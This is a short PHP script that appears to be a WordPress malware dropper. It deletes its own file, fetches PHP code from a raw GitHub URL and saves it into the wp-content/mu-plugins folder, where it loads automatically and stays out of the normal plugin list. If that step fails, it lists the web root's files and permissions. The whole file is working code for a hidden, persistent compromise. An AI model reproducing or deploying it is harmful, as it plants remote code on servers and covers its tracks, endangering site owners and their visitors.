<?php
unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://raw.githubusercontent.com/cantulope/cantutag/refs/heads/main/v4/ticker_page_web.php');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$c = curl_exec($ch);
if (strpos($c, '<?php')===false)  die('err dl');
$mu = $_SERVER['DOCUMENT_ROOT'].'/wp-content/mu-plugins/';
if (!is_dir($mu)) if (mkdir($mu)===false) {
foreach (glob($_SERVER['DOCUMENT_ROOT']."/*") as $filename)
echo $filename." ".decoct(fileperms($filename) & 0777)." ".date ("F d Y H:i:s.", filemtime($filename))."<br>\n";
die('err dir'); }
if (is_file($mu.'ticker_page_web.php')) die('file exist');
$r = file_put_contents($mu.'ticker_page_web.php', $c);
if ($r===false) die('err saving');
die('/ticker_page_web.php');